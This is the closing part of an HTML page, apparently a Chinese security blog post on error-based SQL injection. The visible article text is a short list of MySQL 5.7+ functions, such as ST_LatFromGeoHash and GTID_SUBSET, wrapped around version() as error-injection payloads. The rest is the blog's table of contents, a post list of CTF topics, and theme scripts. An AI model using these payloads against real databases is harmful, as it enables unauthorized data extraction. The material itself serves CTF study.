+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1xktazj30dc05vglq.jpg" alt="12.png"></p>
+<h2 id="Mysql-5-7-以后"><a href="#Mysql-5-7-以后" class="headerlink" title="Mysql 5.7 以后"></a>Mysql 5.7 以后</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ST_LatFromGeoHash()</div><div class="line">    <span class="keyword">select</span> ST_LatFromGeoHash(<span class="keyword">version</span>());</div><div class="line">ST_LongFromGeoHash()</div><div class="line">    <span class="keyword">select</span> ST_LongFromGeoHash(<span class="keyword">version</span>());</div><div class="line">GTID_SUBSET()</div><div class="line">    <span class="keyword">select</span> GTID_SUBSET(<span class="keyword">version</span>(),<span class="number">1</span>);</div><div class="line">GTID_SUBTRACT()</div><div class="line">    <span class="keyword">select</span> <span class="keyword">GTID_SUBTRACT</span>(<span class="keyword">version</span>(),<span class="number">1</span>);</div><div class="line">ST_PointFromGeoHash()</div><div class="line">    <span class="keyword">select</span> ST_PointFromGeoHash(<span class="keyword">version</span>(),<span class="number">1</span>);</div></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">LaLa</a></p>
+        <p><span>Created:</span>2018-04-09, 14:07:12</p>
+        <p><span>Updated:</span>2018-04-09, 19:46:47</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2018/04/09/WEB-SQL报错注入/" title="WEB-SQL报错注入">http://lalajun.com/2018/04/09/WEB-SQL报错注入/</a>
+            <span class="copy-path" data-clipboard-text="From http://lalajun.com/2018/04/09/WEB-SQL报错注入/　　By LaLa" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/04/03/web-phpinfo包含临时文件/">
+                    WEB-基于phpinfo的包含临时文件
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server"><span class="toc-text">SQL Server</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql"><span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#floor"><span class="toc-text">floor()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错利用"><span class="toc-text">报错利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复杂的原理"><span class="toc-text">复杂的原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错利用-1"><span class="toc-text">报错利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错利用-2"><span class="toc-text">报错利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GeometryCollection"><span class="toc-text">GeometryCollection()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错利用-3"><span class="toc-text">报错利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#polygon"><span class="toc-text">polygon()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错利用-4"><span class="toc-text">报错利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#multipoint-multilinestring-multipolygon-linestring"><span class="toc-text">multipoint() multilinestring() multipolygon() linestring()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql-5-7-以后"><span class="toc-text">Mysql 5.7 以后</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/04/03/web-phpinfo包含临时文件/" title="Next: WEB-基于phpinfo的包含临时文件">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 LaLa
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+             post: ".article-entry a[href], .copyright a[href]", 
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
